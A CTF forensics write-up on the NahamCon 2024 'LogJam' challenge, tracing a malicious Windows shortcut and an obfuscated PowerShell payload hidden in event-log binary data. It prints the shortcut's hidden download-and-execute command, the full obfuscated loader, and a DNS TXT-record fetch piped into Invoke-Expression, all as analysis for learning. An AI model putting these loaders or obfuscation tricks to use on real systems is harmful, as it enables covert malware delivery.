@@ -1,0 +1,232 @@
+---
+title: NahamCon CTF 2024 - LogJam (sorta)
+description: ETW~🥰
+tags: [ "ctf", "ctf:forensics" ]
+pubDate: '2025-03-27T17:54:25Z'
+cover: header.png
+---
+
+import { Image } from 'astro:assets';
+import challenge from './challenge.png';
+import normal from './normal.png';
+import weird from './weird.png';
+
+*Moving all of my past CTF write-ups to this website...*
+
+This challenge I didn't have time to even start, but,
+since forensics is fun, I wanted to give it a try even after the CTF ended!
+
+Spoiler: got to the part that would have outputted the flag, but,
+since the CTF is over, didn't actually get to see the flag for myself.
+
+## Challenge
+<Image src={challenge} alt="challenge providing a zip file" />
+
+We are given a zip file! What's inside? Why, none other than a Windows shortcut and 3 log files.
+
+```
+┌──(kali㉿kali)-[~/Downloads/logjam/LogJam]
+└─$ ls -la
+total 2264
+drwxr-xr-x 2 kali kali    4096 May 30 20:51 .
+drwxr-xr-x 3 kali kali    4096 May 30 22:03 ..
+-rw-r--r-- 1 kali kali 1118208 May 19 14:40 Application.evtx
+-rw-r--r-- 1 kali kali 1118208 May 19 14:40 Security.evtx
+-rw-r--r-- 1 kali kali   69632 May 19 14:41 System.evtx
+-rw-r--r-- 1 kali kali    1770 May 19 17:20 Updater.lnk
+```
+
+## Analysis
+I popped them over to my Windows VM to take a quick gander.
+The shortcut .lnk file immediately got removed by antivirus, and there was nothing overly obvious in the log files.
+
+Back into my Linux VM, I found [LnkParse3](https://github.com/Matmaus/LnkParse3) to make my shortcut reading life easier!
+The output is a bit long, but here's the interesting part:
+
+```
+DATA:
+      Relative path: ..\..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Command line arguments: -windowstyle hidden -c "Invoke-RestMethod -Uri not-malware.zip/agent1 | Invoke-Expression"
+
+         -  Storage size: 161
+            Version: '0x53505331'
+            Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0
+            Serialized property values:
+            -  Value size: 133
+               Id: 30
+               Value: C:\Users\Administrator\Desktop\Invoke-Obfuscation-master
+               Value type: VT_LPWSTR
+```
+
+Unfortunately, that payload either no longer exists now that the CTF has ended
+(was considering assuming this and giving up 🥲), or it never existed.
+All we currently know is that PowerShell is currently involved, and it has been obfuscated. Overall, not a huge help.
+
+Let's concentrate more on the logs instead. This part was kinda hard.
+If anything about the payload was going to show up in the logs,
+it would either be in the system log or application log, as far as where to start.
+The system log was much smaller, so I started there.
+Not finding anything, I went to the application log.
+While aimlessly going through each log, I spotted something weird!
+Here's a normal MsiInstaller 1033 log entry:
+
+<Image src={normal} alt="screenshot of a normal event" />
+
+And here's a funny looking one with a large Binary field, as well as a Data field with some text:
+
+<Image src={weird} alt="screenshot of a weird event" />
+
+As someone who is deeply familiar with Event Tracing for Windows, this stood out as very strange.
+ETW events tend to have a fixed schema as defined in an xml manifest file
+(though there is a self-describing schema version these days, as well).
+This is how, in the first screenshot, a series of `EventData`s is able to be parsed from what is otherwise actually a binary blob.
+According to [the documented schema](https://learn.microsoft.com/en-us/windows/win32/msi/event-logging):
+
+> Product: %1. Version: %2. Language: %3. Removal completed with status: %4. Manufacturer: %5.
+>
+> Field 1 - ProductName Field 2 - ProductVersion
+> Field 3 - ProductLanguage
+> Windows Installer 3.1 and earlier: Not available.
+> Field 5 - Manufacturer
+> Windows Installer 4.5 and earlier: Field 5 not available.
+
+Though, the additional binary data is omitted from the documentation for one reason or another.
+The second screenshot only has one piece of data, followed by a binary blob -- not following the schema at all.
+As a bonus, Windows actually tells us it's corrupt in the General view:
+
+> The description for Event ID 1033 from source Msilnstaller cannot be found. Either the component that raises this event is not installed on your local computer or the installation is corrupted. You can install or repair the component on the local computer.
+>
+> If the event originated on another computer, the display information had to be saved with the event.
+>
+> The following information was included with the event:
+>
+> Windows Installer installed the product. Product Name: 7zip. Product Version: 12.4.0.23259341. Product Language: 1033. Manufacturer: 7Zip. Installation success or error status: 0.
+>
+> The message resource is present but the message was not found in the message table
+
+Another bonus fact: Windows also does us the favor of showing the hex and plaintext view of that extra data
+(which incidentally shows us base64).
+I neglected to keep a copy of the base64 for this write-up 🙇,
+but here's its decoded form, in any case, plus myself putting the semicolons on their own line for convenience:
+
+```powershell
+$u7fInY =  [ChAr[]]")''nIOj-]2,11,3[eman.)'*Rdm*' elBAirav-TEg(( & |)93]rAhC[]gNIRTS[,)201]rAhC[+17]rAhC[+68]rAhC[((EcALper.)') (DnEOTdAEr.))iicsa::]gNIdoCNe.TxEt.mETSy'+'s[ , )'+')SsERpMocED::]eDOMNoISSerpMoC.NoIsSERpMOc.OI.metSYs'+'[ ,)'+'fGV=8w+2IX2i/'+'/Px+D1LdDdvgDHx0Da4rfSsissVDjqZXrXd'+'HwwgIMdd+b+'+'I2j3r4jNeKTYFX+H++mnP4L0u3sNsvJHmeAOLH88T030M0luhBzBIGCuwoZX7yZRbnbg7a174PITGc5Xlip/D/z6U5VZ7nO/APBWvIZYNhddwKDsG8A76A7fMef8'+'O6vMfncgC'+'i9gHHfQvjxq+y8Jibd+F+TdgqtK4HCOVjZg78/6RRhjg1A0YH4JIefd/ELkohlDo5GUdwKfiuZIDNFSfsr8Es9Z/T2gyyfY5K59mZ0WF/1ml58psO1MvbfWNxoNhpmDHyan05Am2y4XQm//iSEFVfHZE/Of8jPgvEPIfJ+ZwmLGNeVCUB3hMKc5n7cP713kzRx/a39WSVYB/eBqlcdk2QOQU30/PDdp9Yi3U3QRh8wg+eZu/T2XcjtA'+'3GZQ3AVQTpO6Zr2kvCRgKgVTrN7PANZe/RDBc+V8'+'EjJZgKCETT7pFpgWzmaCxrwq82DXSNNZ/FRZM'+'qDiCq2BulaQdboWAoa'+'H'+'n0EU9UD6QhrFOQRuu1yhr3lTRPcr5sjY428n3s/t5654O/iFOrvgegJUQFKfZ7RuYAQR1BPRah/TkpwdQwP7Z'+'D5HQ3rE'+'Gx'+'/KAZNGHAU9KCJBiglGYLkiq1xTF/iLXu0+kCybeHaht2u/syq0zKjeMn5vOIbvy+6mrt7/8qlTcm1'+'2CK1tomnNAb+cX6slpda2cm/tkFZfVajP/QGBalShL+o8ue/TBDiD9a+Nkx/V26O7cjU5Zx+9HW2'+'ie3y'+'FSiXK6C8TtKxk'+'T4E9fMU'+'KJgINRh32uWVr'+'JX'+'Lhyi2PAIkQJCiN1WUEqAFe/uljU8JPr4JbIqfDigSdZRClCUCfpHCrhUZY'+'4hy4ESnjVAtifBUTb/cgjdQmu/jWin+B2Wb54'+'PMHg8Oys'+'qv+'+'/Xbsn'+'67Hi5E3HcGbT78ftpLhAhuWQ7I0eCVg5pGNwVsJeiDejH/vXdKhUUdJcKbLa/Yx8mMFRqW5Wp1QhzszU2XlUqM7npZVGzssm55b4c2B5IB'+'QRZXnOiEzv/r5inQulI3WaFL0iX'+'Ij2JQ7cxOS1PXdLOEViOIqKYo93AXID8PQ+2PE4'+'s'+'9bpRVffGV (G'+'N'+'I'+'Rts46esa'+'BMOrF::]TrevNoC[]MAERTsYrOmeM.Oi'+'.meTsys[(mAErtseTALFed.nO'+'ISsErPmOc.oi.mETSy'+'s  tcEjBO-weN ( (REdAerMaeRtS.oi.meTsy'+'S  tcEjBO-weN ( nOIssERpXE-eKOVNi'(";
+
+[arRaY]::reverSe( (  VArIABle ('U7'+'fINY') -vA) );
+
+.( $VerbOSeprEfERencE.tOSTRing()[1,3]+'x'-JoiN'')( -JoIN(  VArIABle ('U7'+'fINY') -vA) )
+```
+
+Honestly, the obfuscation is pretty terrible, but it, of course, serves the purpose of hiding its intent from non-humans,
+which I guess is okay.
+It's also important to mention PowerShell is case-insensitive.
+Here's what these three lines do:
+
+* The first line just declares a character array -- aka a string with extra steps.
+* The second line does an in-place reverse of that array.
+
+Line 3 does a few things, and, to describe it more easily, allow me to clean it up...
+
+```powershell
+. ($VerbosePreference.ToString()[1,3]  +'x' -join '') (-join (variable('U7'+'fINY') -Va))
+```
+
+I could go on forever about all the weird PowerShell tricks being used here,
+but what's important to note is that the `.` operator, in this case, is going to execute something.
+The 0th parameter is what will be executed, and the 1st parameter is the arguments -- both strings.
+
+For the first set of parenthesis, we get iex (aka Invoke-Expression, which does what you think it does).
+The first set is obviously the reverse of our `u7fInY` variable.
+Let's evaluate, as well as do some cleanup because the string is being split into a million pieces...
+
+```powershell
+('iNVOKe-EXpREssIOn ( New-OBjEct  SysTem.io.StReaMreAdER( ( New-OBjEct  sySTEm.io.cOmPrEsSIOn.deFLATestrEAm([sysTem.iO.MemOrYsTREAM][CoNverT]::FrOMBase64stRING( VGffVRpb9s4EP2+QP8DIXA39oYKqIOiVEOLdXP1SOxc7QJ2jIXi0LFaW3IluQni5r/vzEiOnXZRQBI5B2c4b55msszGVZpn7MqUlX2UzszhQ1pW5WqRFMm8xY/aLbKcJdUUhKdXv/HjeDieJsVwNGp5gVCe0I7QWuhAhLptf87TbGcH3E5iH76nsbX/+vqsyO8gHMP45bW2B+niWj/umQdjgc/bTUBfitAVjnSE4yh4YZUhrCHpfCUClCRZdSgiDfqIbJ4rPJ8Ujlu/eFAqEUW1NiCJQkIAP2iyhLXJrVWu23hRNIgJKUMf9E4TkxKtT8C6KXiSFy3ei2WH9+xZ5Ujc7O62V/xkN+a9DiDBT/eu8o+LhSlaBGQ/PjaVfZFkt/mc2adpls6Xc+bANnmot1KC21mcTlq8/7trm6+yvbIOv5nMejKz0qys/u2thaHebyCk+0uXLi/FTx1qikLYGlgiBJCK9UAHGNZAK/xGEr3QH5DZ7PwQdwpkT/haRPB1RQAYuR7ZfKFQUJgegvrOFi/O4565t/s3n824Yjs5rcPRTl3rhy1uuRQOFrhQ6DU9UE0nHaoAWobdQaluB2qCiDqMZRF/ZNNSXD28qwrxCamzWgpFp7TTECKgZJjE8V+cBDR/eZNAP7NrTVgKgRCvk2rZ6OpTQVA3QZG3AtjcX2T/uZe+gw8hRQ3U3iY9pdDP/03UQOQ2kdclqBe/BYVSW93a/xRzk317Pc7n5cKMh3BUCVeNGLmwZ+JfIPEvgPj8fO/EZHfVFESi//mQX4y2mA50nayHDmphNoxNWfbvM1Osp85lm1/FW0Zm95K5Yfyyg2T/Z9sE8rsfSFNDIZuifKwdUG5oDlhokLE/dfeIJ4HY0A1gjhRR6/87gZjVOCH4KtqgdT+F+dbiJ8y+qxjvQfHHg9iCgcnfMv6O8feMf7A67A8GsDKwddhNYZIvWBPA/On7ZV5U6z/D/pilX5cGTIP471a7gbnbRZy7XZowuCGIBzBhul0M030T88HLOAemHJvsNs3u0L4Pnm++H+XFYTKeNj4r3j2I+b+ddMIgwwHdXrXZqjDVssisSfr4aD0xHDgvdDdL1D+xP//i2XI2+w8=VGf), [sYStem.IO.cOMpRESsIoN.CoMpreSSIoNMODe]::DEcoMpREsS)) , [sySTEm.tExT.eNCodINg]::ascii)).rEAdTOEnD( )').repLAcE(([ChAr]86+[ChAr]71+[ChAr]102),[STRINg][ChAr]39)| & ((gET-variABle '*mdR*').name[3,11,2]-jOIn'')
+```
+
+Regarding this part:
+
+```powershell
+(gET-variABle '*mdR*').name[3,11,2]-jOIn''
+```
+
+It basically turns into `iex`.
+It relies in *Windows* default PowerShell's `MaximumDriveCount` variable to work, incidentally.
+Otherwise, the `| &` is what you expect: piping and executing.
+
+We can ditch that `iex` part and evaluate it safely to see what we get.
+
+```powershell
+function Test-FileExists{param($F)(Test-Path$F)}
+$G=[char[]](36,53,71,77,76,87)-join''
+$L=4
+$M="C:\Program Files\7-Zip\7z.exe"
+$H=[char[]](40,82,101,115,111,108,118,101,45,68,110,115,78,97,109,101,32,34,97,112,112,108,105,99,97,116,105,111,110,46,101,118,116,120,46,122,105,112,34,32,45,84,121,112,101,32,116,120,116)-join''
+for($N=0;$N-lt100;$N++){$L+=$N;$M=$M.ToUpper()}
+$O=Get-Random -Minimum 1 -Maximum 100
+$P=if($O%2-eq0){"Even"}else{"Odd"}
+$J=[char[]](105,102,32,40,36,53,71,77,76,87,32,45,109,97,116,99,104,32,39,94,91,45,65,45,90,97,45,122,97,45,122,48,45,57,43,47,93,42,61,123,48,44,51,125,36,39,41)-join''
+$Q=New-Object 'object[]'100
+$K=[char[]](32,123,32,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,85,84,70,56,46,71,101,116,83,116,114,105,110,103,40,91,83,121,115,116,101,109,46,67,111,110,118,101,114,116,93,58,58,70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103,40,36,53,71,77,76,87,41,41,32,124,32,73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110,32,125)-join''
+$CV=$env:comspec[4,15,25] -join ''
+for($R=0;$R-lt$Q.Length;$R++){$Q[$R]=Get-Random}
+function Get-ProcessOwner{param($S)$T=Get-Process -Name $S;}
+$W=Get-Process
+$I=[char[]](32,124,32,70,111,114,69,97,99,104,45,79,98,106,101,99,116,32,123,32,36,95,46,83,116,114,105,110,103,115,32,125,41,59)-join''
+while($L -gt $N){$GZ="$G=$H $I $J $K"; & $CV $GZ; break}
+$V=$V|Sort-Object -Unique
+$Z=@()
+for($AA=0;$AA-lt10;$AA++){$Z+=$AA}
+$AB=$Z|Sort-Object -Descending
+$AC=$AB|ForEach-Object{$AD=$_;if ($AD -gt 5) {return"fizz"} else {return"fizzbuzz"}} *>$null
+```
+
+Oh my god it never ends 😂! Okay maybe the obfuscation is less terrible -- or at least more annoying -- than I thought.
+The only danger line here is `while($L -gt $N){$GZ="$G=$H $I $J $K"; & $CV $GZ; break}`,
+which has the `&` operator that will execute stuff (you'd be right if you thought `$CV` is `iex`).
+Otherwise, we can evaluate away!
+
+```powershell
+$G=[char[]](36,53,71,77,76,87)-join''
+$L=4
+$M="C:\Program Files\7-Zip\7z.exe"
+$H=[char[]](40,82,101,115,111,108,118,101,45,68,110,115,78,97,109,101,32,34,97,112,112,108,105,99,97,116,105,111,110,46,101,118,116,120,46,122,105,112,34,32,45,84,121,112,101,32,116,120,116)-join''
+for($N=0;$N-lt100;$N++){$L+=$N;$M=$M.ToUpper()}
+$O=Get-Random -Minimum 1 -Maximum 100
+$P=if($O%2-eq0){"Even"}else{"Odd"}
+$J=[char[]](105,102,32,40,36,53,71,77,76,87,32,45,109,97,116,99,104,32,39,94,91,45,65,45,90,97,45,122,97,45,122,48,45,57,43,47,93,42,61,123,48,44,51,125,36,39,41)-join''
+$Q=New-Object 'object[]'100
+$K=[char[]](32,123,32,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,85,84,70,56,46,71,101,116,83,116,114,105,110,103,40,91,83,121,115,116,101,109,46,67,111,110,118,101,114,116,93,58,58,70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103,40,36,53,71,77,76,87,41,41,32,124,32,73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110,32,125)-join''
+$CV=$env:comspec[4,15,25] -join ''
+for($R=0;$R-lt$Q.Length;$R++){$Q[$R]=Get-Random}
+function Get-ProcessOwner{param($S)$T=Get-Process -Name $S;}
+$W=Get-Process
+$I=[char[]](32,124,32,70,111,114,69,97,99,104,45,79,98,106,101,99,116,32,123,32,36,95,46,83,116,114,105,110,103,115,32,125,41,59)-join''
+
+"$G=$H $I $J $K"
+
+#...
+
+$5GMLW=(Resolve-DnsName "application.evtx.zip" -Type txt  | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-za-z0-9+/]*={0,3}$')  { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression }
+```
+
+Here's where we seem to get cut short 😭
+
+```
+PS C:\Users\Tim> (Resolve-DnsName "application.evtx.zip" -Type txt  | ForEach-Object { $_.Strings });
+Resolve-DnsName : application.evtx.zip : DNS name does not exist
+At line:1 char:2
++ (Resolve-DnsName "application.evtx.zip" -Type txt  | ForEach-Object { ...
++  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (application.evtx.zip:String) [Resolve-DnsName], Win32Exception
+    + FullyQualifiedErrorId : DNS_ERROR_RCODE_NAME_ERROR,Microsoft.DnsClient.Commands.ResolveDnsName
+```
+
+The record no longer exists, and there's nothing else obvious in the log files.
+This is where I gave up! I looked around for a write-up, [found one](https://youtu.be/2VQzfRP3dYE?si=0UYYdz3J9xlw3Bx3&t=2302),
+and it looks like we were on the right track!
+This last piece of code would have given us the flag 🤷
+
+This did indeed end up being fun! If only I had time to do it 🥲
+
+I also wonder if that first url we found actually included something 🤔
+
